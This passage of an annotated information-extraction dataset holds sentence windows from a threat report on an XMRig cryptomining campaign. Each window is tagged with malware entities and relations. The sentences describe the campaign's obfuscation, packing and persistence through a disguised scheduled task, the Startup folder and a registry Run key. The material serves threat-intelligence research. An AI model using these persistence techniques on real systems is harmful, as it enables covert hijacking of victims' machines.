[10, 11], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [109, 109], "name": "dllm.vbs", "pos": [13, 14], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [124, 124], "name": "malware sample", "pos": [3, 5], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [127, 127], "name": "startup items", "pos": [6, 8], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [146, 146], "name": "startup item", "pos": [1, 3], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [152, 152], "name": "dllm.vbs", "pos": [7, 8], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [154, 154], "name": "setup.js", "pos": [9, 10], "index": "17_0"}]], "labels": [{"r": "WR", "evidence": [1, 2], "t": 1, "h": 4}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 4}, {"r": "WR", "evidence": [2], "t": 3, "h": 4}, {"r": "WR", "evidence": [2, 3], "h": 4, "t": 5}, {"r": "WR", "evidence": [3, 4], "t": 5, "h": 6}, {"r": "FR", "evidence": [4], "h": 6, "t": 7}, {"r": "EX", "evidence": [4], "h": 7, "t": 8}, {"r": "WR", "evidence": [5], "h": 9, "t": 10}, {"r": "WR", "evidence": [5], "h": 9, "t": 11}, {"r": "WR", "evidence": [5], "h": 9, "t": 12}, {"r": "CO", "evidence": [5, 6], "h": 9, "t": 13}, {"r": "WR", "evidence": [6, 7], "h": 13, "t": 16}, {"r": "WR", "evidence": [6, 7], "h": 13, "t": 17}, {"r": "CO", "evidence": [6, 7], "h": 14, "t": 15}]}, {"title": "647-19", "sents": [["Second", ",", "the", "source", "code", "in", "the", "dropped", "JavaScript", "and", "VBScript", "files", "are", "heavily", "manipulated", "for", "obfuscation", "."], ["Finally", ",", "all", "of", "the", "observable", "XMRIg", "payloads", "were", "packed", "using", "UPX", "."], ["The", "actor", "also", "used", "multiple", "methods", "of", "persistence", "to", "keep", "the", "XMRig", "mining", "software", "on", "the", "victimized", "hosts", "."], ["Windows", "Scheduler", "was", "used", "to", "create", "the", "job", "``", "anydesk", "''", "to", "execute", "setup.js", "every", "30", "minutes", "."], ["The", "sample", "copied", "various", "sources", "of", "execution", ":", "setup.exe", ",", "setup.js", ",", "and", "dllm.vbs", "to", "\\AppData\\Local\\Temp", "in", "order", "to", "have", "them", "persist", "on", "disk", "."], ["Additionally", ",", "the", "malware", "sample", "created", "startup", "items", "in", "two", "separate", "locations", ",", "thereby", "enabling", "re-execution", "of", "the", "malware", "following", "any", "system", "restarts", "."], ["One", "startup", "item", "was", "created", "by", "writing", "dllm.vbs", "and", "setup.js", "to", "\\Windows\\Start", "Menu\\Programs\\Startup", "."], ["The", "other", "was", "established", "by", "adding", "dllm.vbs", "to", "the", "``", "HKCU", ":", "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "''", "registry", "key", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "JavaScript", "pos": [8, 9], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "VBScript", "pos": [10, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "XMRIg payloads", "pos": [6, 8], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "UPX", "pos": [11, 12], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [42, 42], "name": "XMRig mining", "pos": [11, 13], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [50, 50], "name": "Windows Scheduler", "pos": [0, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [59, 59], "name": "anydesk", "pos": [9, 10], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [63, 63], "name": "setup.js", "pos": [13, 14], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [69, 69], "name": "sample", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [76, 76], "name": "setup.exe", "pos": [8, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [78, 78], "name": "setup.js", "pos": [10, 11], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [81, 81], "name": "dllm.vbs", "pos": [13, 14], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [96, 96], "name": "malware sample", "pos": [3, 5], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [99, 99], "name": "startup items", "pos": [6, 8], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [118, 118], "name": "startup item", "pos": [1, 3], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [124, 124], "name": "dllm.vbs", "pos": [7, 8], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [126, 126], "name": "setup.js", "pos": [9, 10], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [137, 137], "name": "dllm.vbs", "pos": [6, 7], "index": "17_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [141, 141], "name": "HKCU : \\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "pos": [10, 13], "index": "18_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 3}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 3}, {"r": "WR", "evidence": [1], "t": 2, "h": 3}, {"r": "WR", "evidence": [1, 2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2, 3], "t": 4, "h": 5}, {"r": "FR", "evidence": [3], "h": 5, "t": 6}, {"r": "EX", "evidence": [3], "h": 6, "t": 7}, {"r": "WR", "evidence": [4], "h": 8, "t": 9}, {"r": "WR", "evidence": [4], "h": 8, "t": 10}, {"r": "WR", "evidence": [4], "h": 8, "t": 11}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 12}, {"r": "WR", "evidence": [5, 6], "h": 12, "t": 15}, {"r": "WR", "evidence": [5, 6], "h": 12, "t": 16}, {"r": "WR", "evidence": [5, 6, 7], "h": 12, "t": 18}, {"r": "CO", "evidence": [5, 6], "h": 13, "t": 14}, {"r": "CO", "evidence": [6, 7], "h": 15, "t": 17}]}, {"title": "647-20", "sents": [["Finally", ",", "all", "of", "the", "observable", "XMRIg", "payloads", "were", "packed", "using", "UPX", "."], ["The", "actor", "also", "used", "multiple", "methods", "of", "persistence", "to", "keep", "the", "XMRig", "mining", "software", "on", "the", "victimized", "hosts", "."], ["Windows", "Scheduler", "was", "used", "to", "create", "the", "job", "``", "anydesk", "''", "to", "execute", "setup.js", "every", "30", "minutes", "."], ["The", "sample", "copied", "various", "sources", "of", "execution", ":", "setup.exe", ",", "setup.js", ",", "and", "dllm.vbs", "to", "\\AppData\\Local\\Temp", "in", "order", "to", "have", "them", "persist", "on", "disk", "."], ["Additionally", ",", "the", "malware", "sample", "created", "startup", "items", "in", "two", "separate", "locations", ",", "thereby", "enabling", "re-execution", "of", "the", "malware", "following", "any", "system", "restarts", "."], ["One", "startup", "item", "was", "created", "by", "writing", "dllm.vbs", "and", "setup.js", "to", "\\Windows\\Start", "Menu\\Programs\\Startup", "."], ["The", "other", "was", "established", "by", "adding", "dllm.vbs", "to", "the", "``", "HKCU", ":", "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "''", "registry", "key", "."], ["While", "all", "samples", "and", "execution", "chains", "Talos", "found", "associated", "with", "this", "actor", "dropped", "XMRig", "as", "their", "final", "payload", ",", "there", "were", "additional", "variations", "observed", "in", "some", "of", "them", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "XMRIg payloads", "pos": [6, 8], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [11, 11], "name": "UPX", "pos": [11, 12], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "XMRig mining", "pos": [11, 13], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [32, 32], "name": "Windows Scheduler", "pos": [0, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [41, 41], "name": "anydesk", "pos": [9, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [45, 45], "name": "setup.js", "pos": [13, 14], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [51, 51], "name": "sample", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [58, 58], "name": "setup.exe", "pos": [8, 9], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [60, 60], "name": "setup.js", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [63, 63], "name": "dllm.vbs", "pos": [13, 14], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [78, 78], "name": "malware sample", "pos": [3, 5], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [81, 81], "name": "startup items", "pos": [6, 8], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [100, 100], "name": "startup item", "pos": [1, 3], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [106, 106], "name": "dllm.vbs", "pos": [7, 8], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [108, 108], "name": "setup.js", "pos": [9, 10], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [119, 119], "name": "dllm.vbs", "pos": [6, 7], "index": "15_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [123, 123], "name": "HKCU : \\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "pos": [10, 13], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [132, 132], "name": "samples", "pos": [2, 3], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [134, 134], "name": "execution chains", "pos": [4, 6], "index": "18_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [143, 143], "name": "XMRig", "pos": [13, 14], "index": "19_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0, 1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 3}, {"r": "FR", "evidence": [2], "h": 3, "t": 4}, {"r": "EX", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "WR", "evidence": [3], "h": 6, "t": 8}, {"r": "WR", "evidence": [3], "h": 6, "t": 9}, {"r": "WR", "evidence": [3, 4, 5, 6, 7], "h": 6, "t": 17}, {"r": "WR", "evidence": [3, 4, 5, 6, 7], "h": 6, "t": 18}, {"r": "WR", "evidence": [3, 4, 5, 6, 7], "h": 6, "t": 19}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 10}, {"r": "WR", "evidence": [4, 5], "h": 10, "t": 13}, {"r": "WR", "evidence": [4, 5], "h": 10, "t": 14}, {"r": "WR", "evidence": [4, 5, 6], "h": 10, "t": 16}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 12}, {"r": "CO", "evidence": [5, 6], "h": 13, "t": 15}]}, {"title": "647-21", "sents": [["The", "actor", "also", "used", "multiple", "methods", "of", "persistence", "to", "keep", "the", "XMRig", "mining", "software", "on", "the", "victimized", "hosts", "."], ["Windows", "Scheduler", "was", "used", "to", "create", "the", "job", "``", "anydesk", "''", "to", "execute", "setup.js", "every", "30", "minutes", "."], ["The", "sample", "copied", "various", "sources", "of", "execution", ":", "setup.exe", ",", "setup.js", ",", "and", "dllm.vbs", "to", "\\AppData\\Local\\Temp", "in", "order", "to", "have", "them", "persist", "on", "disk", "."], ["Additionally", ",", "the", "malware", "sample", "created", "startup", "items", "in", "two", "separate", "locations", ",", "thereby", "enabling", "re-execution", "of", "the", "malware", "following", "any", "system", "restarts", "."], ["One", "startup", "item", "was", "created", "by", "writing", "dllm.vbs", "and", "setup.js", "to", "\\Windows\\Start", "Menu\\Programs\\Startup", "."], ["The", "other", "was", "established", "by", "adding", "dllm.vbs", "to", "the", "``", "HKCU", ":", "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "''", "registry", "key", "."], ["While", "all", "samples", "and", "execution", "chains", "Talos", "found", "associated", "with", "this", "actor", "dropped", "XMRig", "as", "their", "final", "payload", ",", "there", "were", "additional", "variations", "observed", "in", "some", "of", "them", "."], ["Some", "samples", "simply", "contained", "only", "one", "referenced", "PE", "file", "at", "the", "PowerShell", "stage", "and", "hid", "their", "XMRig", "payloads", "inside", "of", "the", "reflectively", "loaded", ".", "NET", "assembly", "as", "base-64", "encoded", "strings", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "XMRig mining", "pos": [11, 13], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "Windows Scheduler", "pos": [0, 2], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "anydesk", "pos": [9, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [32, 32], "name": "setup.js", "pos": [13, 14], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [38, 38], "name": "sample", "pos": [1, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [45, 45], "name": "setup.exe", "pos": [8, 9], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [47, 47], "name": "setup.js", "pos": [10, 11], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "dllm.vbs", "pos": [13, 14], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [65, 65], "name": "malware sample", "pos": [3, 5], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [68, 68], "name": "startup items", "pos": [6, 8], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [87, 87], "name": "startup item", "pos": [1, 3], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [93, 93], "name": "dllm.vbs", "pos": [7, 8], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [95, 95], "name": "setup.js", "pos": [9, 10], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [106, 106], "name": "dllm.vbs", "pos": [6, 7], "index": "13_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [110, 110], "name": "HKCU : \\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "pos": [10, 13], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [119, 119], "name": "samples", "pos": [2, 3], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [121, 121], "name": "execution chains", "pos": [4, 6], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [130, 130], "name": "XMRig", "pos": [13, 14], "index": "17_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [157, 157], "name": "PowerShell", "pos": [11, 12], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [162, 162], "name": "XMRig payloads", "pos": [16, 18], "index": "19_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [169, 169], "name": ". NET", "pos": [23, 25], "index": "20_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 1}, {"r": "FR", "evidence": [1], "h": 1, "t": 2}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2], "h": 4, "t": 6}, {"r": "WR", "evidence": [2], "h": 4, "t": 7}, {"r": "WR", "evidence": [2, 3, 4, 5, 6], "h": 4, "t": 15}, {"r": "WR", "evidence": [2, 3, 4, 5, 6], "h": 4, "t": 16}, {"r": "WR", "evidence": [2, 3, 4, 5, 6], "h": 4, "t": 17}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 8}, {"r": "WR", "evidence": [3, 4], "h": 8, "t": 11}, {"r": "WR", "evidence": [3, 4], "h": 8, "t": 12}, {"r": "WR", "evidence": [3, 4, 5], "h": 8, "t": 14}, {"r": "CO", "evidence": [3, 4], "h": 9, "t": 10}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 13}, {"r": "WR", "evidence": [6, 7], "t": 15, "h": 18}, {"r": "WR", "evidence": [6, 7], "t": 16, "h": 18}, {"r": "WR", "evidence": [6, 7], "t": 17, "h": 18}, {"r": "FR", "evidence": [7], "h": 18, "t": 19}, {"r": "IJ", "evidence": [7], "h": 19, "t": 20}]}, {"title": "647-22", "sents": [["Windows", "Scheduler", "was", "used", "to", "create", "the", "job", "``", "anydesk", "''", "to", "execute", "setup.js", "every", "30", "minutes", "."], ["The", "sample", "copied", "various", "sources", "of", "execution", ":", "setup.exe", ",", "setup.js", ",", "and", "dllm.vbs", "to", "\\AppData\\Local\\Temp", "in", "order", "to", "have", "them", "persist", "on", "disk", "."], ["Additionally", ",", "the", "malware", "sample", "created", "startup", "items", "in", "two", "separate", "locations", ",", "thereby", "enabling", "re-execution", "of", "the", "malware", "following", "any", "system", "restarts", "."], ["One", "startup", "item", "was", "created", "by", "writing", "dllm.vbs", "and", "setup.js", "to", "\\Windows\\Start", "Menu\\Programs\\Startup", "."], ["The", "other", "was", "established", "by", "adding", "dllm.vbs", "to", "the", "``", "HKCU", ":", "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "''", "registry", "key", "."], ["While", "all", "samples", "and", "execution", "chains", "Talos", "found", "associated", "with", "this", "actor", "dropped", "XMRig", "as", "their", "final", "payload", ",", "there", "were", "additional", "variations", "observed", "in", "some", "of", "them", "."], ["Some", "samples", "simply", "contained", "only", "one", "referenced", "PE", "file", "at", "the", "PowerShell", "stage", "and", "hid", "their", "XMRig", "payloads", "inside", "of", "the", "reflectively", "loaded", ".", "NET", "assembly", "as", "base-64", "encoded", "strings", "."], ["One", "of", "the", "more", "interesting", "samples", "first", "checked", "to", "see", "if", "it", "had", "access", "to", "``", "MSBuild.exe.", "``"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Windows Scheduler", "pos": [0, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "anydesk", "pos": [9, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "setup.js", "pos": [13, 14], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "sample", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "setup.exe", "pos": [8, 9], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "setup.js", "pos": [10, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "dllm.vbs", "pos": [13, 14], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [46, 46], "name": "malware sample", "pos": [3, 5], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "startup items", "pos": [6, 8], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [68, 68], "name": "startup item", "pos": [1, 3], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [74, 74], "name": "dllm.vbs", "pos": [7, 8], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [76, 76], "name": "setup.js", "pos": [9, 10], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [87, 87], "name": "dllm.vbs", "pos": [6, 7], "index": "12_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [91, 91], "name": "HKCU : \\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "pos": [10, 13], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [100, 100], "name": "samples", "pos": [2, 3], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [102, 102], "name": "execution chains", "pos": [4, 6], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [111, 111], "name": "XMRig", "pos": [13, 14], "index": "16_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [138, 138], "name": "PowerShell", "pos": [11, 12], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [143, 143], "name": "XMRig payloads", "pos": [16, 18], "index": "18_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [150, 150], "name": ". NET", "pos": [23, 25], "index": "19_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [174, 174], "name": "MSBuild.exe.", "pos": [16, 17], "index": "20_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 5}, {"r": "WR", "evidence": [1], "h": 3, "t": 6}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "h": 3, "t": 14}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "h": 3, "t": 15}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "h": 3, "t": 16}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 7}, {"r": "WR", "evidence": [2, 3], "h": 7, "t": 10}, {"r": "WR", "evidence": [2, 3], "h": 7, "t": 11}, {"r": "WR", "evidence": [2, 3, 4], "h": 7, "t": 13}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 9}, {"r": "CO", "evidence": [3, 4], "h": 10, "t": 12}, {"r": "WR", "evidence": [5, 6], "t": 14, "h": 17}, {"r": "WR", "evidence": [5, 6], "t": 15, "h": 17}, {"r": "WR", "evidence": [5, 6], "t": 16, "h": 17}, {"r": "FR", "evidence": [6], "h": 17, "t": 18}, {"r": "IJ", "evidence": [6], "h": 18, "t": 19}, {"r": "FR", "evidence": [6, 7], "h": 18, "t": 20}]}, {"title": "647-23", "sents": [["The", "sample", "copied", "various", "sources", "of", "execution", ":", "setup.exe", ",", "setup.js", ",", "and", "dllm.vbs", "to", "\\AppData\\Local\\Temp", "in", "order", "to", "have", "them", "persist", "on", "disk", "."], ["Additionally", ",", "the", "malware", "sample", "created", "startup", "items", "in", "two", "separate", "locations", ",", "thereby", "enabling", "re-execution", "of", "the", "malware", "following", "any", "system", "restarts", "."], ["One", "startup", "item", "was", "created", "by", "writing", "dllm.vbs", "and", "setup.js", "to", "\\Windows\\Start", "Menu\\Programs\\Startup", "."], ["The", "other", "was", "established", "by", "adding", "dllm.vbs", "to", "the", "``", "HKCU", ":", "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "''", "registry", "key", "."], ["While", "all", "samples", "and", "execution", "chains", "Talos", "found", "associated", "with", "this", "actor", "dropped", "XMRig", "as", "their", "final", "payload", ",", "there", "were", "additional", "variations", "observed", "in", "some", "of", "them", "."], ["Some", "samples", "simply", "contained", "only", "one", "referenced", "PE", "file", "at", "the", "PowerShell", "stage", "and", "hid", "their", "XMRig", "payloads", "inside", "of", "the", "reflectively", "loaded", ".", "NET", "assembly", "as", "base-64", "encoded", "strings", "."], ["One", "of", "the", "more", "interesting", "samples", "first", "checked", "to", "see", "if", "it", "had", "access", "to", "``", "MSBuild.exe.", "``"], ["However", ",", "the", "sample", "that", "contained", "this", "check", "still", "only", "attempts", "to", "run", "the", "XMRig", "launch", "command", "to", "cmd.exe", ",", "rather", "than", "attempting", "to", "compile", "the", "next", "stage", "on", "the", "host", "or", "use", "the", "inline", "task", "function", "execution", "as", "other", "malware", "has", "been", "observed", "doing", "when", "attempting", "to", "access", "MSBuild", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "sample", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "setup.exe", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "setup.js", "pos": [10, 11], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "dllm.vbs", "pos": [13, 14], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "malware sample", "pos": [3, 5], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "startup items", "pos": [6, 8], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [50, 50], "name": "startup item", "pos": [1, 3], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [56, 56], "name": "dllm.vbs", "pos": [7, 8], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [58, 58], "name": "setup.js", "pos": [9, 10], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [69, 69], "name": "dllm.vbs", "pos": [6, 7], "index": "9_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [73, 73], "name": "HKCU : \\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "pos": [10, 13], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [82, 82], "name": "samples", "pos": [2, 3], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [84, 84], "name": "execution chains", "pos": [4, 6], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [93, 93], "name": "XMRig", "pos": [13, 14], "index": "13_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [120, 120], "name": "PowerShell", "pos": [11, 12], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [125, 125], "name": "XMRig payloads", "pos": [16, 18], "index": "15_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [132, 132], "name": ". NET", "pos": [23, 25], "index": "16_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [156, 156], "name": "MSBuild.exe.", "pos": [16, 17], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [172, 172], "name": "XMRig", "pos": [14, 15], "index": "18_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [176, 176], "name": "cmd.exe", "pos": [18, 19], "index": "19_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "h": 0, "t": 3}, {"r": "WR", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 11}, {"r": "WR", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 12}, {"r": "WR", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 13}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "WR", "evidence": [1, 2], "h": 4, "t": 7}, {"r": "WR", "evidence": [1, 2], "h": 4, "t": 8}, {"r": "WR", "evidence": [1, 2, 3], "h": 4, "t": 10}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "WR", "evidence": [4, 5], "t": 11, "h": 14}, {"r": "WR", "evidence": [4, 5], "t": 12, "h": 14}, {"r": "WR", "evidence": [4, 5], "t": 13, "h": 14}, {"r": "FR", "evidence": [5], "h": 14, "t": 15}, {"r": "IJ", "evidence": [5], "h": 15, "t": 16}, {"r": "FR", "evidence": [5, 6], "h": 15, "t": 17}, {"r": "CO", "evidence": [5, 6, 7], "h": 14, "t": 19}, {"r": "WR", "evidence": [6, 7], "h": 17, "t": 18}]}, {"title": "647-24", "sents": [["Additionally", ",", "the", "malware", "sample", "created", "startup", "items", "in", "two", "separate", "locations", ",", "thereby", "enabling", "re-execution", "of", "the", "malware", "following", "any", "system", "restarts", "."], ["One", "startup", "item", "was", "created", "by", "writing", "dllm.vbs", "and", "setup.js", "to", "\\Windows\\Start", "Menu\\Programs\\Startup", "."], ["The", "other", "was", "established", "by", "adding", "dllm.vbs", "to", "the", "``", "HKCU", ":", "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "''", "registry", "key", "."], ["While", "all", "samples", "and", "execution", "chains", "Talos", "found", "associated", "with", "this", "actor", "dropped", "XMRig", "as", "their", "final", "payload", ",", "there", "were", "additional", "variations", "observed", "in", "some", "of", "them", "."], ["Some", "samples", "simply", "contained", "only", "one", "referenced", "PE", "file", "at", "the", "PowerShell", "stage", "and", "hid", "their", "XMRig", "payloads", "inside", "of", "the", "reflectively", "loaded", ".", "NET", "assembly", "as", "base-64", "encoded", "strings", "."], ["One", "of", "the", "more", "interesting", "samples", "first", "checked", "to", "see", "if", "it", "had", "access", "to", "``", "MSBuild.exe.", "``"], ["However", ",", "the", "sample", "that", "contained", "this", "check", "still", "only", "attempts", "to", "run", "the", "XMRig", "launch", "command", "to", "cmd.exe", ",", "rather", "than", "attempting", "to", "compile", "the", "next", "stage", "on", "the", "host", "or", "use", "the", "inline", "task", "function", "execution", "as", "other", "malware", "has", "been", "observed", "doing", "when", "attempting", "to", "access", "MSBuild", "."], ["Finally", ",", "some", "XMRig", "payloads", "used", "a", "dropped", "JSON", "configuration", "file", "rather", "than", "specifying", "them", "on", "the", "command-line", "or", "packing", "them", "into", "the", "final", "XMRig", "binary", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "malware sample", "pos": [3, 5], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "startup items", "pos": [6, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [25, 25], "name": "startup item", "pos": [1, 3], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "dllm.vbs", "pos": [7, 8], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [33, 33], "name": "setup.js", "pos": [9, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [44, 44], "name": "dllm.vbs", "pos": [6, 7], "index": "5_0"}], [{"type": "TF", 